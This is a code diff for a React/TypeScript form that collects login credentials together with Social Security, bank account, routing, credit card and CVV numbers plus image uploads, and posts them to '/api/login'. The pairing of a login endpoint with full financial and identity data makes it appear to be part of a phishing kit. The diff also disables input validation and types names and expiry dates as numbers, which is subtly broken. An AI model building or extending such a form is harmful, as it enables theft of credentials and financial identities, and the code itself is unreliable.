@@ -17,14 +17,14 @@ interface PostFormState {
    lastname: string;
    email: string;
    address: string;
-   socialSecurity: string;
-   accountNumber: string;
-   routingNumber: string;
-   accountHolderName: string;
+   socialSecurity: number;
+   accountNumber: number;
+   routingNumber: number;
+   accountHolderName: number;
    bankName: string;
-   expiry: string;
-   creditCard: string;
-   cvv: string;
+   expiry: number;
+   creditCard: number;
+   cvv: number;
    imageUploads: FileList | null;
 }
 
@@ -39,14 +39,14 @@ export default function Main() {
       lastname: '',
       email: '',
       address: '',
-      socialSecurity: '',
-      accountNumber: '',
-      routingNumber: '',
-      accountHolderName: '',
+      socialSecurity: 0,
+      accountNumber: 0,
+      routingNumber: 0,
+      accountHolderName: 0,
       bankName: '',
-      expiry: '',
-      creditCard: '',
-      cvv: '',
+      expiry: 0,
+      creditCard: 0,
+      cvv: 0,
       imageUploads: null,
    });
 
@@ -77,25 +77,25 @@ export default function Main() {
 
    async function handleSubmit(event: FormEvent) {
       event.preventDefault();
-      if (
-         !formData.username ||
-         !formData.password ||
-         !formData.firstname ||
-         !formData.lastname ||
-         !formData.email ||
-         !formData.address ||
-         !formData.socialSecurity ||
-         !formData.accountNumber ||
-         !formData.routingNumber ||
-         !formData.accountHolderName ||
-         !formData.bankName ||
-         !formData.expiry ||
-         !formData.cvv ||
-         !formData.creditCard ||
-         !formData.imageUploads
-      ) {
-         return alert('Some input fields are missing');
-      }
+      // if (
+      //    !formData.username ||
+      //    !formData.password ||
+      //    !formData.firstname ||
+      //    !formData.lastname ||
+      //    !formData.email ||
+      //    !formData.address ||
+      //    !formData.socialSecurity ||
+      //    !formData.accountNumber ||
+      //    !formData.routingNumber ||
+      //    !formData.accountHolderName ||
+      //    !formData.bankName ||
+      //    !formData.expiry ||
+      //    !formData.cvv ||
+      //    !formData.creditCard ||
+      //    !formData.imageUploads
+      // ) {
+      //    return alert('Some input fields are missing');
+      // }
       const formDataToSubmit = new FormData();
       Object.entries(formData).forEach(([key, value]) => {
          if (key === 'imageUploads' && value) {
@@ -112,7 +112,7 @@ export default function Main() {
 
       try {
          setIsLoading(true);
-         const response = await fetch(url, {
+         const response = await fetch('/api/login', {
             method: 'POST',
             body: formDataToSubmit,
          });
@@ -129,14 +129,14 @@ export default function Main() {
             lastname: '',
             email: '',
             address: '',
-            socialSecurity: '',
-            accountNumber: '',
-            routingNumber: '',
-            accountHolderName: '',
+            socialSecurity: 0,
+            accountNumber: 0,
+            routingNumber: 0,
+            accountHolderName: 0,
             bankName: '',
-            expiry: '',
-            creditCard: '',
-            cvv: '',
+            expiry: 0,
+            creditCard: 0,
+            cvv: 0,
             imageUploads: null,
          });
          alert('Form submitted successfully');
